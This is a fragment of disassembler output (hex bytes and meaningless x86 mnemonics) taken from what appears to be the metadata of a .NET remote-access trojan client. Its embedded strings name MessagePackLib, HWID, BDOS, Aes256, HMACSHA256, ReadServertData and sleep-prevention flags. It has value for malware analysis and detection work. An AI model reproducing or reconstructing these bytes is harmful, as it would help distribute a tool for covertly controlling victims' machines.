  4075e7:	02 bb 00 00 00 90    	add    -0x70000000(%ebx),%bh
  4075ed:	0b b2 00 00 00 fa    	or     -0x6000000(%edx),%esi
  4075f3:	0e                   	push   %cs
  4075f4:	bf 00 00 00 f5       	mov    $0xf5000000,%edi
  4075f9:	0c b7                	or     $0xb7,%al
  4075fb:	00 00                	add    %al,(%eax)
  4075fd:	00 a1 1a c3 01 00    	add    %ah,0x1c31a(%ecx)
  407603:	00 d2                	add    %dl,%dl
  407605:	0f f8 01             	psubb  (%ecx),%mm0
  407608:	00 00                	add    %al,(%eax)
  40760a:	95                   	xchg   %eax,%ebp
  40760b:	0d fe 01 00 00       	or     $0x1fe,%eax
  407610:	a3 0c 69 02 00       	mov    %eax,0x2690c
  407615:	00 da                	add    %bl,%dl
  407617:	13 6d 02             	adc    0x2(%ebp),%ebp
  40761a:	00 00                	add    %al,(%eax)
  40761c:	05 19 71 02 00       	add    $0x27119,%eax
  407621:	00 8f 1c 75 02 00    	add    %cl,0x2751c(%edi)
  407627:	00 f8                	add    %bh,%al
  407629:	07                   	pop    %es
  40762a:	7a 02                	jp     0x40762e
  40762c:	02 00                	add    (%eax),%al
  40762e:	06                   	push   %es
  40762f:	00 03                	add    %al,(%ebx)
  407631:	00 01                	add    %al,(%ecx)
  407633:	00 07                	add    %al,(%edi)
  407635:	00 03                	add    %al,(%ebx)
  407637:	00 02                	add    %al,(%edx)
  407639:	00 08                	add    %cl,(%eax)
  40763b:	00 05 00 01 00 09    	add    %al,0x9000100
  407641:	00 05 00 02 00 0a    	add    %al,0xa000200
  407647:	00 07                	add    %al,(%edi)
  407649:	00 01                	add    %al,(%ecx)
  40764b:	00 0b                	add    %cl,(%ebx)
  40764d:	00 07                	add    %al,(%edi)
  40764f:	00 02                	add    %al,(%edx)
  407651:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407654:	09 00                	or     %eax,(%eax)
  407656:	01 00                	add    %eax,(%eax)
  407658:	0d 00 09 00 02       	or     $0x2000900,%eax
  40765d:	00 0e                	add    %cl,(%esi)
  40765f:	00 0b                	add    %cl,(%ebx)
  407661:	00 01                	add    %al,(%ecx)
  407663:	00 0f                	add    %cl,(%edi)
  407665:	00 0b                	add    %cl,(%ebx)
  407667:	00 02                	add    %al,(%edx)
  407669:	00 10                	add    %dl,(%eax)
  40766b:	00 0d 00 01 00 11    	add    %cl,0x11000100
  407671:	00 0d 00 02 00 12    	add    %cl,0x12000200
  407677:	00 0f                	add    %cl,(%edi)
  407679:	00 01                	add    %al,(%ecx)
  40767b:	00 13                	add    %dl,(%ebx)
  40767d:	00 0f                	add    %cl,(%edi)
  40767f:	00 02                	add    %al,(%edx)
  407681:	00 14 00             	add    %dl,(%eax,%eax,1)
  407684:	11 00                	adc    %eax,(%eax)
  407686:	02 00                	add    (%eax),%al
  407688:	15 00 13 00 01       	adc    $0x1001300,%eax
  40768d:	00 16                	add    %dl,(%esi)
  40768f:	00 13                	add    %dl,(%ebx)
  407691:	00 02                	add    %al,(%edx)
  407693:	00 17                	add    %dl,(%edi)
  407695:	00 15 00 01 00 18    	add    %dl,0x18000100
  40769b:	00 15 00 02 00 19    	add    %dl,0x19000200
  4076a1:	00 17                	add    %dl,(%edi)
  4076a3:	00 01                	add    %al,(%ecx)
  4076a5:	00 1a                	add    %bl,(%edx)
  4076a7:	00 17                	add    %dl,(%edi)
  4076a9:	00 02                	add    %al,(%edx)
  4076ab:	00 60 00             	add    %ah,0x0(%eax)
  4076ae:	19 00                	sbb    %eax,(%eax)
  4076b0:	02 00                	add    (%eax),%al
  4076b2:	68 00 1b 00 02       	push   $0x2001b00
  4076b7:	00 69 00             	add    %ch,0x0(%ecx)
  4076ba:	1d 00 02 00 8b       	sbb    $0x8b000200,%eax
  4076bf:	00 1f                	add    %bl,(%edi)
  4076c1:	00 01                	add    %al,(%ecx)
  4076c3:	00 8c 00 1f 00 02 00 	add    %cl,0x2001f(%eax,%eax,1)
  4076ca:	8d 00                	lea    (%eax),%eax
  4076cc:	21 00                	and    %eax,(%eax)
  4076ce:	01 00                	add    %eax,(%eax)
  4076d0:	8e 00                	mov    (%eax),%es
  4076d2:	21 00                	and    %eax,(%eax)
  4076d4:	02 00                	add    (%eax),%al
  4076d6:	8f 00                	pop    (%eax)
  4076d8:	23 00                	and    (%eax),%eax
  4076da:	01 00                	add    %eax,(%eax)
  4076dc:	90                   	nop
  4076dd:	00 23                	add    %ah,(%ebx)
  4076df:	00 02                	add    %al,(%edx)
  4076e1:	00 91 00 25 00 02    	add    %dl,0x2002500(%ecx)
  4076e7:	00 92 00 27 00 16    	add    %dl,0x16002700(%edx)
  4076ed:	00 c0                	add    %al,%al
  4076ef:	00 03                	add    %al,(%ebx)
  4076f1:	00 16                	add    %dl,(%esi)
  4076f3:	00 c2                	add    %al,%dl
  4076f5:	00 05 00 16 00 c4    	add    %al,0xc4001600
  4076fb:	00 07                	add    %al,(%edi)
  4076fd:	00 18                	add    %bl,(%eax)
  4076ff:	00 26                	add    %ah,(%esi)
  407701:	01 09                	add    %ecx,(%ecx)
  407703:	00 1f                	add    %bl,(%edi)
  407705:	0f 12 0f             	movlps (%edi),%xmm1
  407708:	2a 0f                	sub    (%edi),%cl
  40770a:	ef                   	out    %eax,(%dx)
  40770b:	05 5b 06 75 06       	add    $0x675065b,%eax
  407710:	9c                   	pushf
  407711:	06                   	push   %es
  407712:	ff 06                	incl   (%esi)
  407714:	27                   	daa
  407715:	07                   	pop    %es
  407716:	00 01                	add    %al,(%ecx)
  407718:	71 00                	jno    0x40771a
  40771a:	fd                   	std
  40771b:	1b 01                	sbb    (%ecx),%eax
  40771d:	00 00                	add    %al,(%eax)
  40771f:	01 73 00             	add    %esi,0x0(%ebx)
  407722:	e8 1b 01 00 00       	call   0x407842
  407727:	01 75 00             	add    %esi,0x0(%ebp)
  40772a:	e6 05                	out    %al,$0x5
  40772c:	02 00                	add    (%eax),%al
  40772e:	41                   	inc    %ecx
  40772f:	01 77 00             	add    %esi,0x0(%edi)
  407732:	fe                   	(bad)
  407733:	1a 02                	sbb    (%edx),%al
  407735:	00 40 01             	add    %al,0x1(%eax)
  407738:	79 00                	jns    0x40773a
  40773a:	ba 08 02 00 40       	mov    $0x40000208,%edx
  40773f:	01 7b 00             	add    %edi,0x0(%ebx)
  407742:	7b 0e                	jnp    0x407752
  407744:	03 00                	add    (%eax),%eax
  407746:	50                   	push   %eax
  407747:	20 00                	and    %al,(%eax)
  407749:	00 2d 00 70 20 00    	add    %ch,0x207000
  40774f:	00 47 00             	add    %al,0x0(%edi)
  407752:	04 80                	add    $0x80,%al
  407754:	00 00                	add    %al,(%eax)
  407756:	01 00                	add    %eax,(%eax)
	...
  407764:	41                   	inc    %ecx
  407765:	1c 00                	sbb    $0x0,%al
  407767:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  407772:	00 00                	add    %al,(%eax)
  407774:	01 00                	add    %eax,(%eax)
  407776:	b8 02 00 00 00       	mov    $0x2,%eax
  40777b:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  407786:	00 00                	add    %al,(%eax)
  407788:	01 00                	add    %eax,(%eax)
  40778a:	eb 0f                	jmp    0x40779b
  40778c:	00 00                	add    %al,(%eax)
  40778e:	00 00                	add    %al,(%eax)
  407790:	04 00                	add    $0x0,%al
	...
  40779a:	00 00                	add    %al,(%eax)
  40779c:	cc                   	int3
  40779d:	00 d1                	add    %dl,%cl
  40779f:	0c 00                	or     $0x0,%al
  4077a1:	00 00                	add    %al,(%eax)
  4077a3:	00 04 00             	add    %al,(%eax,%eax,1)
  4077a6:	00 00                	add    %al,(%eax)
  4077a8:	00 00                	add    %al,(%eax)
  4077aa:	00 00                	add    %al,(%eax)
  4077ac:	70 00                	jo     0x4077ae
  4077ae:	00 00                	add    %al,(%eax)
  4077b0:	01 00                	add    %eax,(%eax)
  4077b2:	42                   	inc    %edx
  4077b3:	08 00                	or     %al,(%eax)
  4077b5:	00 00                	add    %al,(%eax)
  4077b7:	00 0a                	add    %cl,(%edx)
	...
  4077c1:	00 00                	add    %al,(%eax)
  4077c3:	00 cc                	add    %cl,%ah
  4077c5:	00 dc                	add    %bl,%ah
  4077c7:	02 00                	add    (%eax),%al
  4077c9:	00 00                	add    %al,(%eax)
  4077cb:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077d6:	00 00                	add    %al,(%eax)
  4077d8:	cc                   	int3
  4077d9:	00 7c 1a 00          	add    %bh,0x0(%edx,%ebx,1)
  4077dd:	00 00                	add    %al,(%eax)
  4077df:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077ea:	00 00                	add    %al,(%eax)
  4077ec:	01 00                	add    %eax,(%eax)
  4077ee:	a3 17 00 00 00       	mov    %eax,0x17
  4077f3:	00 04 00             	add    %al,(%eax,%eax,1)
  4077f6:	00 00                	add    %al,(%eax)
  4077f8:	00 00                	add    %al,(%eax)
  4077fa:	00 00                	add    %al,(%eax)
  4077fc:	70 00                	jo     0x4077fe
  4077fe:	00 00                	add    %al,(%eax)
  407800:	cc                   	int3
  407801:	00 92 12 00 00 00    	add    %dl,0x12(%edx)
  407807:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40780a:	0b 00                	or     (%eax),%eax
  40780c:	10 00                	adc    %al,(%eax)
  40780e:	0f 00 14 00          	lldt   (%eax,%eax,1)
  407812:	13 00                	adc    (%eax),%eax
  407814:	1e                   	push   %ds
  407815:	00 1d 00 75 01 8d    	add    %bl,0x8d017500
  40781b:	06                   	push   %es
  40781c:	00 41 63             	add    %al,0x63(%ecx)
  40781f:	74 69                	je     0x40788a
  407821:	6f                   	outsl  %ds:(%esi),(%dx)
  407822:	6e                   	outsb  %ds:(%esi),(%dx)
  407823:	60                   	pusha
  407824:	31 30                	xor    %esi,(%eax)
  407826:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  407829:	70 5f                	jo     0x40788a
  40782b:	5f                   	pop    %edi
  40782c:	30 00                	xor    %al,(%eax)
  40782e:	49                   	dec    %ecx
  40782f:	45                   	inc    %ebp
  407830:	6e                   	outsb  %ds:(%esi),(%dx)
  407831:	75 6d                	jne    0x4078a0
  407833:	65 72 61             	gs jb  0x407897
  407836:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  40783a:	31 00                	xor    %eax,(%eax)
  40783c:	43                   	inc    %ebx
  40783d:	61                   	popa
  40783e:	6c                   	insb   (%dx),%es:(%edi)
  40783f:	6c                   	insb   (%dx),%es:(%edi)
  407840:	53                   	push   %ebx
  407841:	69 74 65 60 31 00 4c 	imul   $0x694c0031,0x60(%ebp,%eiz,2),%esi
  407848:	69 
  407849:	73 74                	jae    0x4078bf
  40784b:	60                   	pusha
  40784c:	31 00                	xor    %eax,(%eax)
  40784e:	61                   	popa
  40784f:	31 00                	xor    %eax,(%eax)
  407851:	76 31                	jbe    0x407884
  407853:	00 5f 5f             	add    %bl,0x5f(%edi)
  407856:	53                   	push   %ebx
  407857:	74 61                	je     0x4078ba
  407859:	74 69                	je     0x4078c4
  40785b:	63 41 72             	arpl   %eax,0x72(%ecx)
  40785e:	72 61                	jb     0x4078c1
  407860:	79 49                	jns    0x4078ab
  407862:	6e                   	outsb  %ds:(%esi),(%dx)
  407863:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  40786a:	69 
  40786b:	7a 65                	jp     0x4078d2
  40786d:	3d 33 32 00 4d       	cmp    $0x4d003233,%eax
  407872:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407879:	74 2e                	je     0x4078a9
  40787b:	57                   	push   %edi
  40787c:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  407883:	55                   	push   %ebp
  407884:	49                   	dec    %ecx
  407885:	6e                   	outsb  %ds:(%esi),(%dx)
  407886:	74 33                	je     0x4078bb
  407888:	32 00                	xor    (%eax),%al
  40788a:	54                   	push   %esp
  40788b:	6f                   	outsl  %ds:(%esi),(%dx)
  40788c:	49                   	dec    %ecx
  40788d:	6e                   	outsb  %ds:(%esi),(%dx)
  40788e:	74 33                	je     0x4078c3
  407890:	32 00                	xor    (%eax),%al
  407892:	53                   	push   %ebx
  407893:	77 61                	ja     0x4078f6
  407895:	70 49                	jo     0x4078e0
  407897:	6e                   	outsb  %ds:(%esi),(%dx)
  407898:	74 33                	je     0x4078cd
  40789a:	32 00                	xor    (%eax),%al
  40789c:	3c 3e                	cmp    $0x3e,%al
  40789e:	6f                   	outsl  %ds:(%esi),(%dx)
  40789f:	5f                   	pop    %edi
  4078a0:	5f                   	pop    %edi
  4078a1:	32 00                	xor    (%eax),%al
  4078a3:	61                   	popa
  4078a4:	32 00                	xor    (%eax),%al
  4078a6:	58                   	pop    %eax
  4078a7:	35 30 39 43 65       	xor    $0x65433930,%eax
  4078ac:	72 74                	jb     0x407922
  4078ae:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4078b5:	32 00                	xor    (%eax),%al
  4078b7:	76 32                	jbe    0x4078eb
  4078b9:	00 76 33             	add    %dh,0x33(%esi)
  4078bc:	00 57 72             	add    %dl,0x72(%edi)
  4078bf:	69 74 65 55 49 6e 74 	imul   $0x36746e49,0x55(%ebp,%eiz,2),%esi
  4078c6:	36 
  4078c7:	34 00                	xor    $0x0,%al
  4078c9:	54                   	push   %esp
  4078ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4078cb:	55                   	push   %ebp
  4078cc:	49                   	dec    %ecx
  4078cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4078ce:	74 36                	je     0x407906
  4078d0:	34 00                	xor    $0x0,%al
  4078d2:	47                   	inc    %edi
  4078d3:	65 74 41             	gs je  0x407917
  4078d6:	73 55                	jae    0x40792d
  4078d8:	49                   	dec    %ecx
  4078d9:	6e                   	outsb  %ds:(%esi),(%dx)
  4078da:	74 36                	je     0x407912
  4078dc:	34 00                	xor    $0x0,%al
  4078de:	53                   	push   %ebx
  4078df:	65 74 41             	gs je  0x407923
  4078e2:	73 55                	jae    0x407939
  4078e4:	49                   	dec    %ecx
  4078e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4078e6:	74 36                	je     0x40791e
  4078e8:	34 00                	xor    $0x0,%al
  4078ea:	54                   	push   %esp
  4078eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4078ec:	49                   	dec    %ecx
  4078ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4078ee:	74 36                	je     0x407926
  4078f0:	34 00                	xor    $0x0,%al
  4078f2:	53                   	push   %ebx
  4078f3:	77 61                	ja     0x407956
  4078f5:	70 49                	jo     0x407940
  4078f7:	6e                   	outsb  %ds:(%esi),(%dx)
  4078f8:	74 36                	je     0x407930
  4078fa:	34 00                	xor    $0x0,%al
  4078fc:	54                   	push   %esp
  4078fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4078fe:	55                   	push   %ebp
  4078ff:	49                   	dec    %ecx
  407900:	6e                   	outsb  %ds:(%esi),(%dx)
  407901:	74 31                	je     0x407934
  407903:	36 00 54 6f 49       	add    %dl,%ss:0x49(%edi,%ebp,2)
  407908:	6e                   	outsb  %ds:(%esi),(%dx)
  407909:	74 31                	je     0x40793c
  40790b:	36 00 53 77          	add    %dl,%ss:0x77(%ebx)
  40790f:	61                   	popa
  407910:	70 49                	jo     0x40795b
  407912:	6e                   	outsb  %ds:(%esi),(%dx)
  407913:	74 31                	je     0x407946
  407915:	36 00 48 4d          	add    %cl,%ss:0x4d(%eax)
  407919:	41                   	inc    %ecx
  40791a:	43                   	inc    %ebx
  40791b:	53                   	push   %ebx
  40791c:	48                   	dec    %eax
  40791d:	41                   	inc    %ecx
  40791e:	32 35 36 00 53 68    	xor    0x68530036,%dh
  407924:	61                   	popa
  407925:	32 35 36 00 41 65    	xor    0x65410036,%dh
  40792b:	73 32                	jae    0x40795f
  40792d:	35 36 00 61 65       	xor    $0x65610036,%eax
  407932:	73 32                	jae    0x407966
  407934:	35 36 00 5f 5f       	xor    $0x5f5f0036,%eax
  407939:	53                   	push   %ebx
  40793a:	74 61                	je     0x40799d
  40793c:	74 69                	je     0x4079a7
  40793e:	63 41 72             	arpl   %eax,0x72(%ecx)
  407941:	72 61                	jb     0x4079a4
  407943:	79 49                	jns    0x40798e
  407945:	6e                   	outsb  %ds:(%esi),(%dx)
  407946:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  40794d:	69 
  40794e:	7a 65                	jp     0x4079b5
  407950:	3d 36 00 67 65       	cmp    $0x65670036,%eax
  407955:	74 5f                	je     0x4079b6
  407957:	55                   	push   %ebp
  407958:	54                   	push   %esp
  407959:	46                   	inc    %esi
  40795a:	38 00                	cmp    %al,(%eax)
  40795c:	3c 4d                	cmp    $0x4d,%al
  40795e:	6f                   	outsl  %ds:(%esi),(%dx)
  40795f:	64 75 6c             	fs jne 0x4079ce
  407962:	65 3e 00 4d 65       	gs add %cl,%ds:0x65(%ebp)
  407967:	73 73                	jae    0x4079dc
  407969:	61                   	popa
  40796a:	67 65 50             	addr16 gs push %eax
  40796d:	61                   	popa
  40796e:	63 6b 4c             	arpl   %ebp,0x4c(%ebx)
  407971:	69 62 2e 3c 50 72 69 	imul   $0x6972503c,0x2e(%edx),%esp
  407978:	76 61                	jbe    0x4079db
  40797a:	74 65                	je     0x4079e1
  40797c:	49                   	dec    %ecx
  40797d:	6d                   	insl   (%dx),%es:(%edi)
  40797e:	70 6c                	jo     0x4079ec
  407980:	65 6d                	gs insl (%dx),%es:(%edi)
  407982:	65 6e                	outsb  %gs:(%esi),(%dx)
  407984:	74 61                	je     0x4079e7
  407986:	74 69                	je     0x4079f1
  407988:	6f                   	outsl  %ds:(%esi),(%dx)
  407989:	6e                   	outsb  %ds:(%esi),(%dx)
  40798a:	44                   	inc    %esp
  40798b:	65 74 61             	gs je  0x4079ef
  40798e:	69 6c 73 3e 00 31 44 	imul   $0x42443100,0x3e(%ebx,%esi,2),%ebp
  407995:	42 
  407996:	32 41 31             	xor    0x31(%ecx),%al
  407999:	46                   	inc    %esi
  40799a:	39 39                	cmp    %edi,(%ecx)
  40799c:	30 32                	xor    %dh,(%edx)
  40799e:	42                   	inc    %edx
  40799f:	33 35 46 38 46 38    	xor    0x38463846,%esi
  4079a5:	38 30                	cmp    %dh,(%eax)
  4079a7:	45                   	inc    %ebp
  4079a8:	46                   	inc    %esi
  4079a9:	31 36                	xor    %esi,(%esi)
  4079ab:	39 32                	cmp    %esi,(%edx)
  4079ad:	43                   	inc    %ebx
  4079ae:	45                   	inc    %ebp
  4079af:	39 39                	cmp    %edi,(%ecx)
  4079b1:	34 37                	xor    $0x37,%al
  4079b3:	41                   	inc    %ecx
  4079b4:	31 39                	xor    %edi,(%ecx)
  4079b6:	33 44 35 41          	xor    0x41(%ebp,%esi,1),%eax
  4079ba:	36 39 38             	cmp    %edi,%ss:(%eax)
  4079bd:	44                   	inc    %esp
  4079be:	38 46 35             	cmp    %al,0x35(%esi)
  4079c1:	36 38 42 44          	cmp    %al,%ss:0x44(%edx)
  4079c5:	41                   	inc    %ecx
  4079c6:	37                   	aaa
  4079c7:	32 31                	xor    (%ecx),%dh
  4079c9:	36 35 38 45 44 34    	ss xor $0x34444538,%eax
  4079cf:	43                   	inc    %ebx
  4079d0:	35 38 42 00 47       	xor    $0x47004238,%eax
  4079d5:	43                   	inc    %ebx
  4079d6:	00 45 53             	add    %al,0x53(%ebp)
  4079d9:	5f                   	pop    %edi
  4079da:	53                   	push   %ebx
  4079db:	59                   	pop    %ecx
  4079dc:	53                   	push   %ebx
  4079dd:	54                   	push   %esp
  4079de:	45                   	inc    %ebp
  4079df:	4d                   	dec    %ebp
  4079e0:	5f                   	pop    %edi
  4079e1:	52                   	push   %edx
  4079e2:	45                   	inc    %ebp
  4079e3:	51                   	push   %ecx
  4079e4:	55                   	push   %ebp
  4079e5:	49                   	dec    %ecx
  4079e6:	52                   	push   %edx
  4079e7:	45                   	inc    %ebp
  4079e8:	44                   	inc    %esp
  4079e9:	00 45 53             	add    %al,0x53(%ebp)
  4079ec:	5f                   	pop    %edi
  4079ed:	44                   	inc    %esp
  4079ee:	49                   	dec    %ecx
  4079ef:	53                   	push   %ebx
  4079f0:	50                   	push   %eax
  4079f1:	4c                   	dec    %esp
  4079f2:	41                   	inc    %ecx
  4079f3:	59                   	pop    %ecx
  4079f4:	5f                   	pop    %edi
  4079f5:	52                   	push   %edx
  4079f6:	45                   	inc    %ebp
  4079f7:	51                   	push   %ecx
  4079f8:	55                   	push   %ebp
  4079f9:	49                   	dec    %ecx
  4079fa:	52                   	push   %edx
  4079fb:	45                   	inc    %ebp
  4079fc:	44                   	inc    %esp
  4079fd:	00 4d 61             	add    %cl,0x61(%ebp)
  407a00:	70 4e                	jo     0x407a50
  407a02:	61                   	popa
  407a03:	6d                   	insl   (%dx),%es:(%edi)
  407a04:	65 54                	gs push %esp
  407a06:	6f                   	outsl  %ds:(%esi),(%dx)
  407a07:	4f                   	dec    %edi
  407a08:	49                   	dec    %ecx
  407a09:	44                   	inc    %esp
  407a0a:	00 48 57             	add    %cl,0x57(%eax)
  407a0d:	49                   	dec    %ecx
  407a0e:	44                   	inc    %esp
  407a0f:	00 67 65             	add    %ah,0x65(%edi)
  407a12:	74 5f                	je     0x407a73
  407a14:	46                   	inc    %esi
  407a15:	6f                   	outsl  %ds:(%esi),(%dx)
  407a16:	72 6d                	jb     0x407a85
  407a18:	61                   	popa
  407a19:	74 49                	je     0x407a64
  407a1b:	44                   	inc    %esp
  407a1c:	00 45 58             	add    %al,0x58(%ebp)
  407a1f:	45                   	inc    %ebp
  407a20:	43                   	inc    %ebx
  407a21:	55                   	push   %ebp
  407a22:	54                   	push   %esp
  407a23:	49                   	dec    %ecx
  407a24:	4f                   	dec    %edi
  407a25:	4e                   	dec    %esi
  407a26:	5f                   	pop    %edi
  407a27:	53                   	push   %ebx
  407a28:	54                   	push   %esp
  407a29:	41                   	inc    %ecx
  407a2a:	54                   	push   %esp
  407a2b:	45                   	inc    %ebp
  407a2c:	00 38                	add    %bh,(%eax)
  407a2e:	37                   	aaa
  407a2f:	36 33 39             	xor    %ss:(%ecx),%edi
  407a32:	31 32                	xor    %esi,(%edx)
  407a34:	36 45                	ss inc %ebp
  407a36:	41                   	inc    %ecx
  407a37:	37                   	aaa
  407a38:	37                   	aaa
  407a39:	42                   	inc    %edx
  407a3a:	33 35 38 46 32 36    	xor    0x36324638,%esi
  407a40:	35 33 32 33 36       	xor    $0x36333233,%eax
  407a45:	37                   	aaa
  407a46:	44                   	inc    %esp
  407a47:	42                   	inc    %edx
  407a48:	41                   	inc    %ecx
  407a49:	36 37                	ss aaa
  407a4b:	43                   	inc    %ebx
  407a4c:	35 33 31 30 45       	xor    $0x45303133,%eax
  407a51:	46                   	inc    %esi
  407a52:	35 30 41 38 44       	xor    $0x44384130,%eax
  407a57:	39 38                	cmp    %edi,(%eax)
  407a59:	38 38                	cmp    %bh,(%eax)
  407a5b:	45                   	inc    %ebp
  407a5c:	44                   	inc    %esp
  407a5d:	30 37                	xor    %dh,(%edi)
  407a5f:	30 43 44             	xor    %al,0x44(%ebx)
  407a62:	34 30                	xor    $0x30,%al
  407a64:	45                   	inc    %ebp
  407a65:	31 46 36             	xor    %eax,0x36(%esi)
  407a68:	30 35 41 38 46 00    	xor    %dh,0x463841
  407a6e:	67 65 74 5f          	addr16 gs je 0x407ad1
  407a72:	41                   	inc    %ecx
  407a73:	53                   	push   %ebx
  407a74:	43                   	inc    %ebx
  407a75:	49                   	dec    %ecx
  407a76:	49                   	dec    %ecx
  407a77:	00 53 79             	add    %dl,0x79(%ebx)
  407a7a:	73 74                	jae    0x407af0
  407a7c:	65 6d                	gs insl (%dx),%es:(%edi)
  407a7e:	2e 49                	cs dec %ecx
  407a80:	4f                   	dec    %edi
  407a81:	00 49 73             	add    %cl,0x73(%ecx)
  407a84:	58                   	pop    %eax
  407a85:	50                   	push   %eax
  407a86:	00 42 44             	add    %al,0x44(%edx)
  407a89:	4f                   	dec    %edi
  407a8a:	53                   	push   %ebx
  407a8b:	00 45 53             	add    %al,0x53(%ebp)
  407a8e:	5f                   	pop    %edi
  407a8f:	43                   	inc    %ebx
  407a90:	4f                   	dec    %edi
  407a91:	4e                   	dec    %esi
  407a92:	54                   	push   %esp
  407a93:	49                   	dec    %ecx
  407a94:	4e                   	dec    %esi
  407a95:	55                   	push   %ebp
  407a96:	4f                   	dec    %edi
  407a97:	55                   	push   %ebp
  407a98:	53                   	push   %ebx
  407a99:	00 67 65             	add    %ah,0x65(%edi)
  407a9c:	74 5f                	je     0x407afd
  407a9e:	49                   	dec    %ecx
  407a9f:	56                   	push   %esi
  407aa0:	00 73 65             	add    %dh,0x65(%ebx)
  407aa3:	74 5f                	je     0x407b04
  407aa5:	49                   	dec    %ecx
  407aa6:	56                   	push   %esi
  407aa7:	00 47 65             	add    %al,0x65(%edi)
  407aaa:	6e                   	outsb  %ds:(%esi),(%dx)
  407aab:	65 72 61             	gs jb  0x407b0f
  407aae:	74 65                	je     0x407b15
  407ab0:	49                   	dec    %ecx
  407ab1:	56                   	push   %esi
  407ab2:	00 4d 54             	add    %cl,0x54(%ebp)
  407ab5:	58                   	pop    %eax
  407ab6:	00 76 61             	add    %dh,0x61(%esi)
  407ab9:	6c                   	insb   (%dx),%es:(%edi)
  407aba:	75 65                	jne    0x407b21
  407abc:	5f                   	pop    %edi
  407abd:	5f                   	pop    %edi
  407abe:	00 52 65             	add    %dl,0x65(%edx)
  407ac1:	61                   	popa
  407ac2:	64 53                	fs push %ebx
  407ac4:	65 72 76             	gs jb  0x407b3d
  407ac7:	65 72 74             	gs jb  0x407b3e
  407aca:	44                   	inc    %esp
  407acb:	61                   	popa
  407acc:	74 61                	je     0x407b2f
  407ace:	00 64 61 74          	add    %ah,0x74(%ecx,%eiz,2)
  407ad2:	61                   	popa
  407ad3:	00 6d 73             	add    %ch,0x73(%ebp)
  407ad6:	63 6f 72             	arpl   %ebp,0x72(%edi)
  407ad9:	6c                   	insb   (%dx),%es:(%edi)
  407ada:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  407ae1:	65 6d                	gs insl (%dx),%es:(%edi)
  407ae3:	2e 43                	cs inc %ebx
  407ae5:	6f                   	outsl  %ds:(%esi),(%dx)
  407ae6:	6c                   	insb   (%dx),%es:(%edi)
  407ae7:	6c                   	insb   (%dx),%es:(%edi)
  407ae8:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407aed:	6e                   	outsb  %ds:(%esi),(%dx)
  407aee:	73 2e                	jae    0x407b1e
  407af0:	47                   	inc    %edi
  407af1:	65 6e                	outsb  %gs:(%esi),(%dx)
  407af3:	65 72 69             	gs jb  0x407b5f
  407af6:	63 00                	arpl   %eax,(%eax)
  407af8:	4d                   	dec    %ebp
  407af9:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407b00:	74 2e                	je     0x407b30
  407b02:	56                   	push   %esi
  407b03:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  407b0a:	73 69                	jae    0x407b75
  407b0c:	63 00                	arpl   %eax,(%eax)
  407b0e:	67 65 74 5f          	addr16 gs je 0x407b71
  407b12:	53                   	push   %ebx
  407b13:	65 6e                	outsb  %gs:(%esi),(%dx)
  407b15:	64 53                	fs push %ebx
  407b17:	79 6e                	jns    0x407b87
  407b19:	63 00                	arpl   %eax,(%eax)
  407b1b:	45                   	inc    %ebp
  407b1c:	6e                   	outsb  %ds:(%esi),(%dx)
  407b1d:	64 52                	fs push %edx
  407b1f:	65 61                	gs popa
  407b21:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  407b25:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  407b2c:	00 
  407b2d:	54                   	push   %esp
  407b2e:	68 72 65 61 64       	push   $0x64616572
  407b33:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  407b37:	64 00 49 6e          	add    %cl,%fs:0x6e(%ecx)
  407b3b:	6e                   	outsb  %ds:(%esi),(%dx)
  407b3c:	65 72 41             	gs jb  0x407b80
  407b3f:	64 64 00 53 48       	fs add %dl,%fs:0x48(%ebx)
  407b44:	41                   	inc    %ecx
  407b45:	32 35 36 4d 61 6e    	xor    0x6e614d36,%dh
  407b4b:	61                   	popa
  407b4c:	67 65 64 00 67 65    	gs add %ah,%fs:0x65(%bx)
  407b52:	74 5f                	je     0x407bb3
  407b54:	43                   	inc    %ebx
  407b55:	6f                   	outsl  %ds:(%esi),(%dx)
  407b56:	6e                   	outsb  %ds:(%esi),(%dx)
  407b57:	6e                   	outsb  %ds:(%esi),(%dx)
  407b58:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b5d:	00 67 65             	add    %ah,0x65(%edi)
  407b60:	74 5f                	je     0x407bc1
  407b62:	49                   	dec    %ecx
  407b63:	73 43                	jae    0x407ba8
  407b65:	6f                   	outsl  %ds:(%esi),(%dx)
  407b66:	6e                   	outsb  %ds:(%esi),(%dx)
  407b67:	6e                   	outsb  %ds:(%esi),(%dx)
  407b68:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b6d:	00 73 65             	add    %dh,0x65(%ebx)
  407b70:	74 5f                	je     0x407bd1
  407b72:	49                   	dec    %ecx
  407b73:	73 43                	jae    0x407bb8
  407b75:	6f                   	outsl  %ds:(%esi),(%dx)
  407b76:	6e                   	outsb  %ds:(%esi),(%dx)
  407b77:	6e                   	outsb  %ds:(%esi),(%dx)
